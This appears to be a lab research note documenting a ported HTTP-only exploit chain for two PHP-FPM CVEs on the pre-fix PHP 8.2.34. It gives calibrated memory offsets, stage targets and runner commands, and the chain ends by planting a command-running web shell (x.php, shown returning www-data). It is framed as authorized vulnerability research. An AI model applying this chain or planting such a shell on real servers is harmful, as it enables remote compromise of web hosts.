# PHP 8.2.34 FPM 128M port (real-CVE quadrant)

Lab-only research note. This is the curated release copy of the main research
log (`docs/108`); the live container, scripts and full logs stay in the main
workspace. Authorized lab targets only; see `ACCEPTABLE_USE.md` and
`SECURITY.md`.

## Result

The chunk-relative pure-HTTP chain from the 8.5.11 FPM lab (same runner,
stage bodies) ports to **PHP 8.2.34 FPM**, which is **pre-fix** for
CVE-2026-109618 / CVE-2026-109619 (fixed in 8.2.35): real-CVE quadrant.

- in-run `ROUNDS=3` single invocation: **PASS=3/3**, every round `ASSERT OK`;
- `/srv/www/x.php` = **392 B**; `GET /x.php?0=id` = `uid=33(www-data)`;
- measured sampler: `NO-GDB CHECK rounds=3 gdb_hits=0`; child stays alive;
- matrix `fpm-8234-http-1w` (`proof`, `oracle=http`, runner `fpm8511http`
  with `--profile 8234`): 3 independent runs PASS **101.4 / 92.4 / 104.9 s**;
- matrix after registration: **57 cases = 49 proof + 2 refuse + 6 gap,
  21/57 `oracle=http`**; scoring A/B stays 87.55 / 85.05 (single-case rule:
  no upgrade for one additional case).

No new mechanism: cleanup=Off, single-shot `BG(unserialize)`, rfc1867
pre-RINIT decode, `var_push` aim and `ps_files` writer behave as on 8.5.11.

## Environment

| Item | Value |
|---|---|
| Image | `p2s-phpfpm-lab:8.2.34` (BASE `php:8.2.34-fpm`; sha256 `a917845973544ae769db2a203b85a7a18a16fe4faa5e4962575a46728ec290f6`) |
| Container | `p2s-fpm8234-128`, host port **19134**, pool `www-1.conf` (`pm=static`, 1 worker), `--cap-add SYS_PTRACE` (calibration only) |
| ini | `labs/fpm/php-128m-8234.ini` = `php-128m.ini` + `session.upload_progress.cleanup = Off` (copy; shared ini untouched) |
| PHP | 8.2.34 (built 2026-10-21), `memory_limit=128M`, `save_path=/var/lib/php/sessions`, `serialize_handler=php`, cleanup=Off verified |
| Page | `labs/fpm/www/_r41prime2.php` (lab diagnostic prime page; precondition) |

The 8.5.11 lab (port 19113) is not touched; the runner only adds a profile.

## Version differences (one-off gdb calibration)

| Quantity | 8.5.11 (pad=64) | **8.2.34 (this lab)** |
|---|---|---|
| `BG(unserialize).data` | +0x368 | **+0x350** |
| `BG(unserialize).level` | +0x370 | **+0x358** |
| `d` after prime | chunk+0x110000 | **chunk+0xFE000** |
| `E = d->last` | d+0x1C000 | **d+0x1C000** (same relative) |
| `DT = d->first_dtor` | d+0x3000 | **d+0x3000** (same relative) |
| `progress` / `ps_files` | 0x62000 / 0x56208 | **same** |
| floor `F` (8 lifters) | 0x79000 | **0x7A000** |
| `S = d - F` | 0x97000 | **0x84000** |
| `copy1 = F+roundup(S+1)+0x18` | d+0x1018 | **d+0x1018** |
| R2a aim (`progress+0x50`) | -103416 (-0x193F8) | **-94200 (-0x16FF8)** |
| R3 writer aim (`ps_files+0`) | -109505 | **-100289 (-0x187C1)** |

Tagged with `S=0x84000`: `DT[0]=0x3FE` (=0x1FE8/8+1), `E[0]=0x35FE`
(=0x1AFE8/8+1), then `E[0]` increments per decode - the copy covers DT/E
and the stale decode really runs.

Patch offsets are identical to 8.5.11 (`0x1FE8/0x1FF8/0x2008/0x2018/0x2020/
0x1AFE8`), but the builder must assert `len(fill)==0x84000` (8.2 `S`), not
the 8.5 value.

## Prime / grow measurement

- HTTP grow: same shape as 8.5.11 (7 x (8 B key + 20 file fields) + 1 x
  (7 MB key + 20 file fields)); 8/8 requests 200;
  `sess_SP = 7,048,390 B` (8.5.11: 7,050,470 B; session format differs by ~2 KB).
- prime: `GET /_r41prime2.php?mb=114&pad=64` -> **HTTP 500, 0 B body**;
  php-fpm log has the `Allowed memory size ... exhausted` fatal and
  `Failed to decode session object. Session has been destroyed`;
  **child PID 11 -> 11 unchanged**.
- R1 record: `SR=355 B` (8.5.11: 368 B; session format difference).
- gdb reads `BG level=1` / `data=d` once during calibration only; all stage
  decisions afterwards use HTTP responses and session bytes.

## Full-chain evidence (in-run `ROUNDS=3`)

Runner: `PROFILE=8234 ROUNDS=3 bash labs/fpm/r41_http_chain.sh --clean`.

| Step | HTTP | Judge / artifact |
|---|---:|---|
| R1(code) | 200 | `SR=355 B`, progress record created |
| prime x3 (before R2a(code)/R2a(K2)/R3; restart -> grow -> restart -> GET prime page) | 500 | OOM fatal, child PID unchanged, `BG level=1` |
| R2a(code): 8 lifters + BIG `S=0x84000`, copy1=d+0x1018, key=code | 502 (expected) | `SR=47 B`, scalarized `upload_progress_...\|i:0;` |
| R1(K2) | 200 | `SR=378 B` |
| R2a(K2): same carrier/aim, key=K2 | 502 (expected) | `SR=70 B`, two scalar records (R3 victim) |
| R3: same carrier, aim_writer=-100289, `DT+0x30=15`, `DT+0x38=/srv/www/x.php\0` | 200 | `x.php=392 B`, judge `uid=33(www-data)` |
| per-round assert | - | `sess_SP=7048390`, `prime_fatal=1`, `child_same=1`, `sr2a=47`, `sr2ak2=70`, `xphp=392B`, `negctrl_no_uid33=1` |
| sampler | - | `NO-GDB CHECK rounds=3 gdb_hits=0` (measured host sampler) |

Matrix runs are separate: 3 independent `--only fpm-8234-http-1w` runs PASS at
**101.4 / 92.4 / 104.9 s** (each `1/1 rounds, gdb_hits=0`; CSV rows PASS).

## Limitations

- lab prime diagnostic page (precondition) + `cleanup=Off` **ini copy** +
  `docker restart` and session/`x.php` cleanup between rounds;
- geometry is one-off gdb calibrated (BG offsets, d, F, S, aims); the stage
  path itself is gdb-free but the constants need a debugger once;
- `F` is per version + per shape/plane; 8.2.34's `F=0x7A000` only holds for
  this version and this stage body;
- 8.2.34 is a pre-fix version (8.2.35 fixed CVE-2026-109618/109619): the value
  is real-CVE quadrant coverage, not a claim about patched 8.2.x;
- matrix registration is a lab-caliber proof and does not change the
  "arbitrary unknown target" generalization limits.

## Reproduction

```bash
# 8.2.34 lab (container p2s-fpm8234-128, host port 19134)
PROFILE=8234 ROUNDS=3 CAL=p2s-fpm8234-128 PORT=19134 \
  bash labs/fpm/r41_http_chain.sh --clean                  # expect PASS=3/3
python3 code/tools/verify_matrix.py --only fpm-8234-http-1w --http-only
```

See `docs/reproducibility.md` for the general lab/oracle rules.

## Licensing

MIT for the original code in this repository (see `LICENSE`); lab-only use.
All code in this tree is original self-implemented p2s work (MIT).
